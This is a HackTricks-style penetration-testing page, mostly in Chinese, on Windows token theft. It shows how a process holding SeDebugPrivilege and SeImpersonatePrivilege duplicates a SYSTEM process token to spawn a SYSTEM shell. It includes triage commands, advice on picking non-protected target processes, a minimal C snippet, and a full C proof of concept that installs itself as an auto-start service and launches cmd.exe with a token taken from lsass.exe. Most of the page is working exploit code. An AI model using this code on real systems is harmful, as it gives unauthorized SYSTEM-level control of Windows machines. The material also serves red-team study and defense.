# SeDebug + SeImpersonate - Copy Token

{{#include ../../banners/hacktricks-training.md}}

本页介绍 **manual token-theft** 变体：一个已经拥有 **`SeDebugPrivilege`** 和 **`SeImpersonatePrivilege`** 的 **High Integrity** 上下文，打开一个合适的 **SYSTEM** 进程，**duplicate its token**，并使用该 token **spawn a new process**。

如果你只需要从一个有特权的 admin 进程快速拿到 `SYSTEM` shell，也可以查看：

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

如果你**没有** process-handle 路径，但你有 **`SeImpersonatePrivilege`**，那么 **named-pipe / Potato** 路线通常更容易：

{{#ref}}
named-pipe-client-impersonation.md
{{#endref}}

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Quick triage

在尝试 token-copy 路径之前，先确认当前进程是否已经处于一个有用的上下文：
```cmd
whoami /groups | findstr /i "high mandatory"
whoami /priv | findstr /i "SeDebugPrivilege SeImpersonatePrivilege"
```
Notes:

- **`SeDebugPrivilege`** 是让你即使在目标进程的 DACL 通常会阻止你的情况下，仍然可以打开许多 **non-protected** 的 SYSTEM 进程。
- **`SeImpersonatePrivilege`** 是让后续使用 **`CreateProcessWithTokenW`** 变得可行的关键。
- 如果 token-copy 路径只给你一个较弱或被过滤的 SYSTEM token，就从 **另一个 SYSTEM process** 里偷取。

## Pick the target process carefully

这个 technique 通常以 **`lsass.exe`** 为例，但在现代 Windows 上，这往往是 **错误的目标**：

- 如果启用了 **LSA Protection / RunAsPPL**，**`lsass.exe`** 会受到保护，即使普通管理员进程有 `SeDebugPrivilege`，也仍然无法打开它。
- 优先选择 **non-PPL SYSTEM processes**，例如 **`winlogon.exe`**、**`wininit.exe`**、**`services.exe`**，或者较早启动的 **`svchost.exe`** 实例。
- **Protected processes** 和一些特殊进程，例如 **`System`** 或 **`csrss.exe`**，并不是这个 technique 在用户态下现实可行的目标。
- 使用提升权限运行的 **Process Hacker / Process Explorer** 来确认目标 token 在复制之前是否真的具有你想要的 privileges。

## API details that matter in practice

很多公开的 PoC 会请求 **`PROCESS_ALL_ACCESS`** 和 **`TOKEN_ALL_ACCESS`**，但这比必要的权限更吵。实际上：

- 打开目标进程时只使用你需要的权限（通常是 **`PROCESS_QUERY_INFORMATION`** 或 **`PROCESS_QUERY_LIMITED_INFORMATION`**）。
- 打开 token 时使用进程创建所需的权限：**`TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY`**。
- 使用 **`DuplicateTokenEx(..., TokenPrimary, ...)`** 创建一个 **primary token**；单独的 impersonation token 不足以创建新进程。
- 如果 **`CreateProcessWithTokenW`** 失败并返回 **`1314`**，改用 **`CreateProcessAsUserW`**。
- 如果你从 **service / Session 0** 启动，记住 **`CreateProcessWithTokenW`** 会让子进程保持在 **调用者的 session** 中。若你需要一个可见的 desktop shell，请使用 **`CreateProcessAsUserW`** 并把 token 移动到目标 session。

一个最小的现代流程如下：
```c
HANDLE hp = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
HANDLE hTok = NULL, hDup = NULL;
OpenProcessToken(hp, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, &hTok);
DuplicateTokenEx(hTok, MAXIMUM_ALLOWED, NULL,
SecurityImpersonation, TokenPrimary, &hDup);
CreateProcessWithTokenW(hDup, LOGON_WITH_PROFILE,
L"C:\\Windows\\System32\\cmd.exe",
NULL, 0, NULL, NULL, &si, &pi);
```
## Full service PoC

以下代码 **利用 `SeDebugPrivilege` 和 `SeImpersonatePrivilege` 权限**，从一个 **以 SYSTEM 身份运行的进程** 复制 token，并获取其 **所有 token privileges**。在这种情况下，代码可以被编译并作为 **Windows service binary** 使用，以验证该 primitive 是否生效。

**提权发生的主要代码部分** 在 **`Exploit`** 函数中。你可以在该函数里看到，程序会搜索 **`lsass.exe`**，复制其 **token**，然后使用该 token 启动一个新的 **`cmd.exe`**，并继承被复制 token 的全部权限。

在现代主机上，你通常会想把 **`lsass.exe`** 替换为其他 **non-PPL SYSTEM process**，例如 **`winlogon.exe`**、**`wininit.exe`** 或 **`services.exe`**。

其他以 SYSTEM 身份运行并拥有全部或大部分 token privileges 的进程包括：**`services.exe`**、**`svchost.exe`**（前面的某些实例）、**`wininit.exe`**、**`csrss.exe`**……记住，通常 **你不能从受保护进程复制 token**。
```c
// From https://cboard.cprogramming.com/windows-programming/106768-running-my-program-service.html
#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#pragma comment (lib, "advapi32")

TCHAR* serviceName = TEXT("TokenDanceSrv");
SERVICE_STATUS serviceStatus;
SERVICE_STATUS_HANDLE serviceStatusHandle = 0;
HANDLE stopServiceEvent = 0;

//This function will find the pid of a process by name
int FindTarget(const char *procname) {

HANDLE hProcSnap;
PROCESSENTRY32 pe32;
int pid = 0;

hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

pe32.dwSize = sizeof(PROCESSENTRY32);

if (!Process32First(hProcSnap, &pe32)) {
CloseHandle(hProcSnap);
return 0;
}

while (Process32Next(hProcSnap, &pe32)) {
if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
pid = pe32.th32ProcessID;
break;
}
}

CloseHandle(hProcSnap);

return pid;
}


int Exploit(void) {

HANDLE hSystemToken, hSystemProcess;
HANDLE dupSystemToken = NULL;
HANDLE hProcess, hThread;
STARTUPINFOA si;
PROCESS_INFORMATION pi;
int pid = 0;


ZeroMemory(&si, sizeof(si));
si.cb = sizeof(si);
ZeroMemory(&pi, sizeof(pi));

// open high privileged process
if ( pid = FindTarget("lsass.exe") )
hSystemProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
else
return -1;

// extract high privileged token
if (!OpenProcessToken(hSystemProcess, TOKEN_ALL_ACCESS, &hSystemToken)) {
CloseHandle(hSystemProcess);
return -1;
}

// make a copy of a token
DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupSystemToken);

// and spawn a new process with higher privs
CreateProcessAsUserA(dupSystemToken, "C:\\windows\\system32\\cmd.exe",
NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

return 0;
}


void WINAPI ServiceControlHandler( DWORD controlCode ) {
switch ( controlCode ) {
case SERVICE_CONTROL_SHUTDOWN:
case SERVICE_CONTROL_STOP:
serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

SetEvent( stopServiceEvent );
return;

case SERVICE_CONTROL_PAUSE:
break;

case SERVICE_CONTROL_CONTINUE:
break;

case SERVICE_CONTROL_INTERROGATE:
break;

default:
break;
}
SetServiceStatus( serviceStatusHandle, &serviceStatus );
}

void WINAPI ServiceMain( DWORD argc, TCHAR* argv[] ) {
// initialise service status
serviceStatus.dwServiceType = SERVICE_WIN32;
serviceStatus.dwCurrentState = SERVICE_STOPPED;
serviceStatus.dwControlsAccepted = 0;
serviceStatus.dwWin32ExitCode = NO_ERROR;
serviceStatus.dwServiceSpecificExitCode = NO_ERROR;
serviceStatus.dwCheckPoint = 0;
serviceStatus.dwWaitHint = 0;

serviceStatusHandle = RegisterServiceCtrlHandler( serviceName, ServiceControlHandler );

if ( serviceStatusHandle ) {
// service is starting
serviceStatus.dwCurrentState = SERVICE_START_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

// do initialisation here
stopServiceEvent = CreateEvent( 0, FALSE, FALSE, 0 );

// running
serviceStatus.dwControlsAccepted |= (SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
serviceStatus.dwCurrentState = SERVICE_RUNNING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

Exploit();
WaitForSingleObject( stopServiceEvent, -1 );

// service was stopped
serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

// do cleanup here
CloseHandle( stopServiceEvent );
stopServiceEvent = 0;

// service is now stopped
serviceStatus.dwControlsAccepted &= ~(SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
serviceStatus.dwCurrentState = SERVICE_STOPPED;
SetServiceStatus( serviceStatusHandle, &serviceStatus );
}
}


void InstallService() {
SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CREATE_SERVICE );

if ( serviceControlManager ) {
TCHAR path[ _MAX_PATH + 1 ];
if ( GetModuleFileName( 0, path, sizeof(path)/sizeof(path[0]) ) > 0 ) {
SC_HANDLE service = CreateService( serviceControlManager,
serviceName, serviceName,
SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, path,
0, 0, 0, 0, 0 );
if ( service )
CloseServiceHandle( service );
}
CloseServiceHandle( serviceControlManager );
}
}

void UninstallService() {
SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CONNECT );

if ( serviceControlManager ) {
SC_HANDLE service = OpenService( serviceControlManager,
serviceName, SERVICE_QUERY_STATUS | DELETE );
if ( service ) {
SERVICE_STATUS serviceStatus;
if ( QueryServiceStatus( service, &serviceStatus ) ) {
if ( serviceStatus.dwCurrentState == SERVICE_STOPPED )
DeleteService( service );
}
CloseServiceHandle( service );
}
CloseServiceHandle( serviceControlManager );
}
}

int _tmain( int argc, TCHAR* argv[] )
{
if ( argc > 1 && lstrcmpi( argv[1], TEXT("install") ) == 0 ) {
InstallService();
}
else if ( argc > 1 && lstrcmpi( argv[1], TEXT("uninstall") ) == 0 ) {
UninstallService();
}
else  {
SERVICE_TABLE_ENTRY serviceTable[] = {
{ serviceName, ServiceMain },
{ 0, 0 }
};

StartServiceCtrlDispatcher( serviceTable );
}

return 0;
}
```
## References

- [CreateProcessWithTokenW function (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [Configure added LSA protection (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
{{#include ../../banners/hacktricks-training.md}}
